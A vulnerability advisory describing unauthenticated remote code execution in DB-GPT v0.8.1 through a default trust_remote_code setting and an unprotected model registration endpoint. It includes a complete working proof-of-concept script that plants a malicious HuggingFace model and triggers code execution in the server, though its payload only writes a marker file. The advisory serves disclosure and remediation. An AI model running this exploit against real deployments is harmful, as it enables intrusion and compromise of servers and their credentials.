# DB-GPT HuggingFace model loading enables `trust_remote_code` by default, allowing unauthenticated remote code execution via a malicious model (CWE-829, CVSS 9.8)

## Summary

DB-GPT v0.8.1 executes remote code shipped with any HuggingFace model by default: `trust_remote_code` defaults to `True` in both the deploy-parameter class `HFLLMDeployModelParameters` (`packages/dbgpt-core/src/dbgpt/model/adapter/hf_adapter.py:46-48`) and the adapter base class `NewHFChatModelAdapter` (`hf_adapter.py:124`), and `loader.py:366-369` forwards `trust_remote_code=True` into `from_pretrained`, so transformers downloads the model repository and `exec_module()` executes arbitrary Python code from it — with no sandbox, no model-source allowlist, and no human confirmation. The model registration endpoint `POST /api/v2/serve/model/models` (`endpoints.py:190`) carries no authentication dependency, and the auth layer returns `role="admin"` for any or no user-id header (`auth.py:25-38`). Combined with the default `0.0.0.0:5670` binding (`configs/dbgpt-proxy-deepseek.toml:9-10`), an unauthenticated attacker registers a malicious `provider="hf"` model and triggers loading; the malicious code then executes inside the DB-GPT server process.

## Details

The vulnerability is a nine-step chain across the model loading path, the model management API, and the auth layer:

1. **Deploy-parameter class defaults to trust** — `hf_adapter.py:46-48`: the deploy parameters for HuggingFace models enable `trust_remote_code` by default, so deploying any HF model automatically trusts and executes its remote code.
2. **Adapter base class repeats the default** — `hf_adapter.py:124`: `NewHFChatModelAdapter` declares `trust_remote_code: bool = True` as a class attribute, so the flag stays `True` even when no explicit value is passed.
3. **Attacker-controlled model name reaches the loader** — `loader.py:85`: `model_path = model_params.real_model_path or model_params.real_provider_model_name` — the model name supplied by the caller is used directly as the `from_pretrained` model path.
4. **The flag is forwarded into transformers** — `loader.py:366-369`: when `model_params.trust_remote_code` is set, `params["trust_remote_code"] = True` is passed into `LoaderClass.from_pretrained(model_path, **params)`; transformers downloads the repository and `exec_module()` executes arbitrary Python code from it.
5. **Zero-authentication registration endpoint** — `endpoints.py:190`: `@router.post("/models")` + `create_model` declares no authentication dependency; anyone who can reach the port can register a model.
6. **The file itself shows the intended pattern** — `endpoints.py:120`: `@router.get("/test_auth", dependencies=[Depends(check_api_key)])` — the contrast confirms the registration route simply lacks the auth dependency.
7. **Mock auth always returns admin** — `auth.py:25-38`: `get_user_from_headers()` returns `role="admin"` for any user-id header, and with no header at all it defaults to `user_id="001"`, `role="admin"` — the default deployment is unauthenticated.
8. **Default public binding** — `configs/dbgpt-proxy-deepseek.toml:9-10`: `[service.web]` binds `host="0.0.0.0"` / `port=5670`.
9. **Endpoint URL composition** — `serve.py:40` + `config.py:12`: `api_prefix = ["/api/v1/worker", f"/api/v2/serve/{APP_NAME}"]` with `APP_NAME = "model"` yields the full registration URL `POST /api/v2/serve/model/models`.

The key code excerpts:

```python
# packages/dbgpt-core/src/dbgpt/model/adapter/hf_adapter.py:46-48 -- the
# deploy-parameter class defaults trust_remote_code to True: deploying any
# HuggingFace model automatically trusts and executes its remote code
trust_remote_code: Optional[bool] = field(default=True, ...)

# hf_adapter.py:124 -- the adapter base class repeats the same default as a
# class attribute, so the flag stays True even when no explicit value is passed
trust_remote_code: bool = True

# packages/dbgpt-core/src/dbgpt/model/adapter/loader.py:85 -- the
# caller-supplied model name is used directly as the from_pretrained path
model_path = model_params.real_model_path or model_params.real_provider_model_name

# loader.py:366-369 -- trust_remote_code=True is forwarded into from_pretrained;
# transformers downloads the repository and exec_module() executes its code
if model_params.trust_remote_code:
    params["trust_remote_code"] = True
model = LoaderClass.from_pretrained(model_path, **params)

# packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38 --
# get_user_from_headers(): any user-id header yields role="admin", and a
# request with no header defaults to user_id="001", role="admin" -- the mock
# auth layer always returns admin, so the default deployment is unauthenticated
```

**Execution happens at the import stage, not at weight loading.** transformers' `exec_module()` runs the module-level code of the repository's `modeling_*.py` before any class instantiation or weight loading. A malicious repository therefore executes its code even without valid weight files, and a subsequent "load failed" error does not undo the execution.

**Why this is a vulnerability:**

- The path is present in the default configuration. A standard installation binds `0.0.0.0:5670`, the mock auth layer returns admin, and `trust_remote_code` defaults to `True` in two independent layers (parameter class and adapter base class) — an administrator who merely configures a model name automatically trusts remote code from that repository. The path is independent of Docker.
- The registration endpoint is the product's own model management API, and the same file demonstrates the authentication pattern (`Depends(check_api_key)` on `/test_auth`) that the registration route omits.
- Deployments that never configured an HF provider are still reachable: the attacker registers the `provider="hf"` model themselves through the zero-authentication endpoint, enabling the path.

## Proof of Concept

Dynamically verified on 2026-08-08 against a default DB-GPT v0.8.1 deployment (default config, `0.0.0.0:5670`, no authentication; Windows and Linux hosts). The PoC below uses only the Python standard library (`urllib`) and drives the full chain through the real service API with no credentials at any step. All 6/6 checks passed. The marker file (`dbgpt_poc_marker.json` — a neutral poc-marker name) is written under the OS temporary directory by the server-side payload and is removed by the cleanup step.

The verification chain:

1. `GET /api/controller/models` — confirm the service is reachable (HTTP 200).
2. Build a malicious HuggingFace model repository: `config.json` with an `auto_map` pointing at `modeling_malicious.py`, whose module-level code writes the marker file containing process context (`pid`, `cwd`, `executable`, `argv`). A unique directory name is used per run to bypass the transformers module cache.
3. `POST /api/v2/serve/model/models` with `provider="hf"` and the malicious repository path — the registration is accepted without authentication (HTTP 200).
4. Trigger model loading — the module-level code executes inside the server process and creates the marker. The load then fails due to missing weights, which is expected: the malicious code has already run at the import stage.
5. Cross-check: the marker's `pid` differs from the PoC client's `pid`.
6. Cross-check: the executing process's `argv` contains `dbgpt`.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC -- DB-GPT v0.8.1 HuggingFace model loading with trust_remote_code enabled
by default allows remote code execution through a malicious model
============================================================================
CWE-829: Inclusion of Functionality from an Untrusted Control Sphere

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected code paths:
    - packages/dbgpt-core/src/dbgpt/model/adapter/hf_adapter.py:46-48
        HFLLMDeployModelParameters.trust_remote_code defaults to True
    - hf_adapter.py:124
        NewHFChatModelAdapter.trust_remote_code = True (class-level default)
    - packages/dbgpt-core/src/dbgpt/model/adapter/loader.py:85
        model_path = real_model_path or real_provider_model_name
        (the model name flows straight into the model path)
    - loader.py:366-369
        trust_remote_code is forwarded into from_pretrained()
    - endpoints.py:190 (model API)
        POST /api/v2/serve/model/models -- model registration endpoint with
        no authentication

Summary:
  DB-GPT v0.8.1 enables trust_remote_code by default in its HuggingFace
  model loading path, both in the parameter class
  (HFLLMDeployModelParameters) and in the adapter base class
  (NewHFChatModelAdapter). The default deployment listens on 0.0.0.0:5670
  without authentication, so an attacker can register a malicious
  provider="hf" model through the unauthenticated registration endpoint
  (POST /api/v2/serve/model/models). When the model is loaded, transformers
  downloads the model repository and executes arbitrary Python code from it
  (module-level code in modeling_*.py), achieving remote code execution.

Trigger conditions:
  1. The server is network reachable (default 0.0.0.0:5670, no
     authentication).
  2. A malicious HuggingFace model is registered and loading is triggered
     (no credentials required).
  3. trust_remote_code is not explicitly set to False (it defaults to True).

Impact:
  Registering a malicious model gives the attacker arbitrary code execution
  (RCE) inside the server process. Module-level code runs before the model
  class is instantiated, so no valid weight files are needed. The
  trust_remote_code mechanism does not go through torch.load and is
  therefore not affected by torch deserialization hardening.

Verification logic (full chain through the real service API, with no
authentication at any step):
  [Precheck]   Confirm the service is reachable
  [Step 1]     Build a malicious HuggingFace model repository (local
               directory: config.json auto_map + malicious modeling code)
  [Step 2]     Register the malicious model without authentication
               (POST /api/v2/serve/model/models, provider=hf)
  [Step 3]     Trigger model loading -> verify the malicious code executed
               inside the server process (marker file)
  [Step 4]     Verify the executing process is the DB-GPT server process
               (pid/argv cross-check, not the PoC client)
  [Step 5]     Cleanup: remove the malicious model directory, the marker,
               the transformers cache, and unregister the worker

Test environment:
  - DB-GPT v0.8.1 (http://localhost:5670)
  - Python 3.11+ (urllib from the standard library, no extra dependencies)
  - Windows 11 / Linux (cross-platform)

Usage:
  python poc.py [--target http://localhost:5670]
"""

import json
import os
import shutil
import sys
import tempfile
import urllib.error
import urllib.request
import uuid

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

PASSED = 0
FAILED = 0

# Malicious model repository directory (local temp directory, simulating an
# attacker-published HuggingFace repository). Each run uses a unique suffix:
# transformers caches loaded modeling modules in the server process
# sys.modules, so re-loading the same path would not re-execute module-level
# code. A unique directory name guarantees a fresh model path on every run ->
# exec_module runs again -> the malicious code is guaranteed to execute.
TMP_BASE = tempfile.gettempdir()
MODEL_DIR = os.path.join(
    TMP_BASE, f"dbgpt_malicious_model_{uuid.uuid4().hex[:8]}"
)
MARKER = os.path.join(TMP_BASE, "dbgpt_poc_marker.json")

# transformers caches modeling files under the user directory (used for cleanup)
HF_MODULE_CACHE = os.path.join(
    os.path.expanduser("~"), ".cache", "huggingface", "modules", "transformers_modules"
)

# Malicious modeling code: executes at module level (import stage), writes a
# marker containing process context to prove execution inside the server
MODELING_CODE = r'''
# -*- coding: utf-8 -*-
# Module-level malicious code: executes at import time (no class
# instantiation needed)
import os
import sys
import json
import tempfile

def _payload():
    marker = os.path.join(tempfile.gettempdir(), "dbgpt_poc_marker.json")
    info = {
        "pid": os.getpid(),
        "cwd": os.getcwd(),
        "executable": sys.executable,
        "argv": sys.argv,
    }
    with open(marker, "w", encoding="utf-8") as f:
        json.dump(info, f, ensure_ascii=False, indent=2)
    return marker

_payload()

from transformers import PretrainedConfig, PreTrainedModel

class MaliciousConfig(PretrainedConfig):
    model_type = "malicioustest"

class MaliciousModel(PreTrainedModel):
    config_class = MaliciousConfig
    def __init__(self, config):
        super().__init__(config)
'''

CONFIG_JSON = {
    "model_type": "malicioustest",
    "architectures": ["MaliciousModel"],
    "auto_map": {
        "AutoConfig": "modeling_malicious.MaliciousConfig",
        "AutoModelForCausalLM": "modeling_malicious.MaliciousModel",
    },
}


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record a single check result; prints [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  [PASS] {name}  {detail}")
    else:
        FAILED += 1
        print(f"  [FAIL] {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 120):
    """Send an HTTP request; returns (status_code, response_text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def build_malicious_model() -> str:
    """Build a malicious HuggingFace model repository (local directory);
    returns the absolute path (forward slashes).

    A unique directory name is generated on every call so transformers treats
    it as a new model path and the module-level malicious code is guaranteed
    to execute again on load.
    """
    global MODEL_DIR
    MODEL_DIR = os.path.join(TMP_BASE, f"dbgpt_malicious_model_{uuid.uuid4().hex[:8]}")
    os.makedirs(MODEL_DIR, exist_ok=True)
    with open(os.path.join(MODEL_DIR, "config.json"), "w", encoding="utf-8") as f:
        json.dump(CONFIG_JSON, f, indent=2)
    with open(
        os.path.join(MODEL_DIR, "modeling_malicious.py"), "w", encoding="utf-8"
    ) as f:
        f.write(MODELING_CODE)
    return os.path.abspath(MODEL_DIR).replace("\\", "/")


def clean_marker():
    if os.path.exists(MARKER):
        os.remove(MARKER)


def marker_exists() -> bool:
    return os.path.exists(MARKER)


def read_marker() -> dict:
    try:
        with open(MARKER, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def clean_transformers_cache():
    """Remove malicious modeling modules cached by transformers (all
    historical directories matching the prefix)."""
    try:
        if os.path.isdir(HF_MODULE_CACHE):
            for name in os.listdir(HF_MODULE_CACHE):
                if name.startswith("dbgpt_malicious_model"):
                    shutil.rmtree(
                        os.path.join(HF_MODULE_CACHE, name), ignore_errors=True
                    )
    except Exception:
        pass


def clean_malicious_dirs():
    """Remove all historical malicious model repository directories
    (including the unique-suffix directory created by this run)."""
    try:
        if os.path.isdir(TMP_BASE):
            for name in os.listdir(TMP_BASE):
                if name.startswith("dbgpt_malicious_model"):
                    shutil.rmtree(
                        os.path.join(TMP_BASE, name), ignore_errors=True
                    )
    except Exception:
        pass


def main() -> bool:
    global PASSED, FAILED
    print()
    print("=" * 62)
    print("  DB-GPT v0.8.1")
    print("  HuggingFace model loading: trust_remote_code enabled by default")
    print("  -> malicious-model remote code execution PoC")
    print(f"  Target: {TARGET}")
    print("=" * 62)
    print()

    # -- Precheck --
    print("[Precheck] Confirm the service is reachable")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  Start the service first: dbgpt start webserver -c <your-config>.toml -y")
        return False
    print()

    # -- Step 1: build the malicious HuggingFace model repository --
    print("[Step 1] Build the malicious HuggingFace model repository (local directory)")
    clean_marker()
    clean_malicious_dirs()
    clean_transformers_cache()
    model_path = build_malicious_model()
    check("Malicious model repository built", os.path.isdir(model_path), model_path)
    if os.path.isdir(model_path):
        files = sorted(os.listdir(model_path))
        print(f"  Files: {files}")
    print()

    # -- Step 2: register the malicious model without authentication --
    print("[Step 2] Register the malicious model without authentication")
    print("         (POST /api/v2/serve/model/models)")
    # The model field and the params.name field must match: the worker
    # registers itself under name and is looked up by model
    reg_body = {
        "host": "127.0.0.1",
        "port": 5670,
        "model": model_path,
        "worker_type": "llm",
        "params": {
            "provider": "hf",
            "name": model_path,
        },
    }
    code, body = api("POST", "/api/v2/serve/model/models", reg_body, timeout=180)
    # The registration is accepted without authentication (HTTP 200). A later
    # load failure due to missing weights is expected: the malicious code has
    # already executed at the import stage of loading.
    check("Unauthenticated model registration accepted", code == 200, f"HTTP {code}")
    print(f"  Response (truncated): {body[:160] if body else ''}")
    print()
    print("  Note: a load failure (missing weights) is expected behavior -- the")
    print("  malicious code already executed at the module-level import stage")

    # -- Step 3: verify the malicious code executed inside the server process
    #    (marker file as physical evidence) --
    print("[Step 3] Verify the malicious code executed (marker file)")
    check("Marker file created", marker_exists(), MARKER)
    print()

    # -- Step 4: verify the executing process is the DB-GPT server
    #    (pid/argv cross-check) --
    print("[Step 4] Verify the executing process is the DB-GPT server process")
    info = read_marker()
    client_pid = os.getpid()
    if info:
        in_server_proc = info.get("pid") != client_pid
        is_server_argv = any("dbgpt" in str(a).lower() for a in info.get("argv", []))
        check("Malicious code executed outside the PoC client process", in_server_proc,
              f"marker pid={info.get('pid')} / client pid={client_pid}")
        check("Executing process is the dbgpt service (argv contains dbgpt)", is_server_argv,
              f"argv={info.get('argv')}")
        print(f"  marker cwd={info.get('cwd')}")
        print(f"  marker executable={info.get('executable')}")
    else:
        check("Marker content parseable", False, "marker missing or malformed")
    print()

    # -- Step 5: cleanup --
    print("[Step 5] Cleanup")
    # Unregister the registered worker (if still present)
    try:
        stop_body = {
            "host": "127.0.0.1",
            "port": 5670,
            "model": model_path,
            "worker_type": "llm",
            "params": {},
        }
        api("POST", "/api/v2/serve/model/models/stop", stop_body, timeout=30)
    except Exception:
        pass
    clean_malicious_dirs()
    clean_marker()
    clean_transformers_cache()
    print("  Malicious model directory / marker / transformers cache removed")
    print()

    # -- Summary --
    total = PASSED + FAILED
    print("=" * 62)
    print(f"  Result: {PASSED}/{total} passed")
    if FAILED == 0:
        print("  Verdict: vulnerability confirmed")
        print("  HuggingFace model loading with trust_remote_code enabled by")
        print("  default -> malicious-model RCE confirmed")
    else:
        print("  Verdict: some checks failed; inspect the service state")
    print("=" * 62)
    print()
    print("Root cause:")
    print("  hf_adapter.py:46-48   -- HFLLMDeployModelParameters.trust_remote_code defaults to True")
    print("  hf_adapter.py:124     -- NewHFChatModelAdapter.trust_remote_code = True")
    print("  loader.py:85          -- model_path = real_model_path or name (name flows straight into the model path)")
    print("  loader.py:366-369     -- trust_remote_code forwarded into from_pretrained()")
    print("  endpoints.py:190      -- POST /api/v2/serve/model/models has no authentication")
    print("  -> unauthenticated malicious-model registration -> arbitrary code")
    print("     execution on load -> CWE-829 RCE")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
```

Expected output: all six checks print `[PASS]` — `DB-GPT service reachable HTTP 200`, `Malicious model repository built`, `Unauthenticated model registration accepted HTTP 200`, `Marker file created`, `Malicious code executed outside the PoC client process` (marker pid differs from the client pid), `Executing process is the dbgpt service (argv contains dbgpt)` — followed by `Result: 6/6 passed` and `Verdict: vulnerability confirmed`.

Notes:

- A "load failed" error during model loading is expected and does not indicate failure of the PoC: transformers' `exec_module()` runs the module-level code at the import stage, before any class instantiation or weight loading, so no valid weight files are required.
- The malicious repository must use a unique directory name per run, otherwise transformers may hit its module cache for a previously loaded repository of the same name and skip re-execution.
- The registration endpoint's full path is `POST /api/v2/serve/model/models`, composed from `api_prefix = ["/api/v1/worker", f"/api/v2/serve/{APP_NAME}"]` (`serve.py:40`) with `APP_NAME = "model"` (`config.py:12`).

## Impact

- **Type:** inclusion of functionality from an untrusted control sphere (CWE-829, primary). Reaching the chain through the registration endpoint requires no authentication (CWE-306, secondary).
- **Who is impacted:** any DB-GPT v0.8.1 deployment whose model-loading path can be reached over the network. The default binding (`0.0.0.0:5670`) combined with the default zero-authentication auth layer exposes the registration endpoint, and `trust_remote_code` is enabled by default. Deployments that never configured an HF provider are still reachable: the attacker registers the `provider="hf"` model themselves through the zero-authentication endpoint. Publishing the malicious model to a public HuggingFace repository extends the attack to every deployment that loads it (phishing / supply-chain poisoning).
- **Attacker capabilities:** arbitrary code execution inside the DB-GPT server process, with its privileges: read database configuration, source code, credentials and environment variables; write arbitrary files; terminate processes (C/I/A:H).
- **Prerequisites:** default configuration only — no non-default setting is required; the path is independent of Docker and present in a standard installation. The attacker needs network reachability to the service and no credentials.

## Affected products

| Field | Value |
|------|------|
| **Vendor** | `eosphoros-ai` |
| **Product** | `DB-GPT` |
| **Affected versions** | `v0.8.1` |
| **Patched versions** | `None` (no official fix released as of the filing date 2026-08-19) |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

- **AV:N** — the attack travels over the network: an unauthenticated HTTP POST to `/api/v2/serve/model/models` on the default `0.0.0.0:5670` binding (verified at `configs/dbgpt-proxy-deepseek.toml:9-10`).
- **AC:L** — building a malicious HuggingFace model repository is a routine operation, and a single registration triggers the chain (PoC 6/6).
- **PR:N** — no privileges required: the registration endpoint declares no authentication dependency and the mock auth layer always returns admin (both source-confirmed).
- **UI:N** — registration and loading are fully automated; no victim interaction.
- **S:U** — `from_pretrained` executes `exec_module()` inside the server process; no security boundary is crossed.
- **C:H / I:H / A:H** — arbitrary code execution: read database configuration, source code, credentials and environment variables; write arbitrary files; terminate processes.

Score computed with the official FIRST CVSS v3.1 formula: ISS = 1−(1−0.56)^3 = 0.914816; Impact(S:U) = 6.42 × 0.914816 = 5.873119; Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.85 = 3.887043; Base = roundup(5.873119 + 3.887043) = 9.8.

**Scope note (alternate scoring).** If scope were treated as Changed, the same vector (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`) mathematically scores 10.0. S:U is the correct choice: the malicious code executes inside the DB-GPT server process without crossing a security boundary.

## Remediation

1. **Network:** restrict port 5670 to internal/trusted networks; do not expose it directly to the internet (firewall/security groups).
2. **Upgrade:** upgrade to an officially fixed version once released; until then, do not load models from untrusted HuggingFace sources.
3. **Configuration:** enable authentication for the model management API, or front it with an authenticating reverse proxy; maintain an allowlist of loadable model repositories.
4. **Monitoring:** alert on calls to `/api/v2/serve/model/models`, on new model registrations, and on abnormal process behavior.
5. **Minimization:** do not run internet-facing model/agent services in production; when unavoidable, front them with a reverse proxy plus authentication.

Code-level fix direction: change the `trust_remote_code` defaults to `False` (explicit opt-in only), and add an authentication dependency to the model registration endpoint, aligning with the `Depends(check_api_key)` pattern used by `/test_auth` at `endpoints.py:120`. As of the filing date (2026-08-19), no official fix had been released.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-14 | Reported to vendor (GitHub issue [#3290](https://github.com/eosphoros-ai/DB-GPT/issues/3290)) |
| 2026-10-14 | This advisory published |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-829 | Inclusion of Functionality from an Untrusted Control Sphere | `trust_remote_code` defaults to `True` in `HFLLMDeployModelParameters` (`hf_adapter.py:46-48`) and in `NewHFChatModelAdapter` (`hf_adapter.py:124`), and `loader.py:366-369` forwards it into `from_pretrained`, so transformers downloads the attacker-controlled repository and `exec_module()` executes arbitrary Python code from it — with no sandbox, no model-source allowlist and no human confirmation |
| 2 | CWE-306 | Missing Authentication for Critical Function | The model registration endpoint `POST /api/v2/serve/model/models` (`endpoints.py:190`) declares no authentication dependency, and `get_user_from_headers()` returns `role="admin"` for any or no user-id header (`auth.py:25-38`) |
